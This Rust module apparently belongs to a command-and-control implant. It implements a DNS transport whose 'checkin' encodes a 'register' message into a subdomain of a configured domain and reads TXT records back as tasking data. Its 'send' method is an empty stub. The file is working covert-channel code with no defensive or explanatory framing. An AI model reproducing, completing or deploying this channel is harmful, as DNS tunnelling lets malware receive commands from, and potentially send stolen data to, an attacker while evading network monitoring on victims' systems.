use async_trait::async_trait;
use super::{Transport, TransportError, TransportResult};
use hickory_resolver::TokioAsyncResolver;
use base64::{Engine as _, engine::general_purpose::STANDARD as B64};

pub struct DnsTransport {
    domain: String,
    resolver: TokioAsyncResolver,
}

impl DnsTransport {
    pub fn new(domain: &str) -> Result<Self, TransportError> {
        let resolver = TokioAsyncResolver::tokio_from_system_conf()
            .map_err(|e| TransportError::Connection(e.to_string()))?;
        Ok(Self {
            domain: domain.to_string(),
            resolver,
        })
    }

    fn encode_query(data: &[u8], domain: &str) -> String {
        let encoded = B64.encode(data).replace('+', "-").replace('/', "_").replace('=', "");
        format!("{}.{}", encoded, domain)
    }
}

#[async_trait]
impl Transport for DnsTransport {
    async fn checkin(&self) -> Result<TransportResult, TransportError> {
        let query = Self::encode_query(b"register", &self.domain);
        let response = self
            .resolver
            .txt_lookup(query)
            .await
            .map_err(|e| TransportError::Connection(e.to_string()))?;
        let mut data = Vec::new();
        for record in response.iter() {
            data.extend_from_slice(record.to_string().as_bytes());
        }
        Ok(TransportResult { data, reused: false })
    }

    async fn send(&self, _data: &[u8]) -> Result<(), TransportError> {
        Ok(())
    }

    fn name(&self) -> &str { "dns" }
}
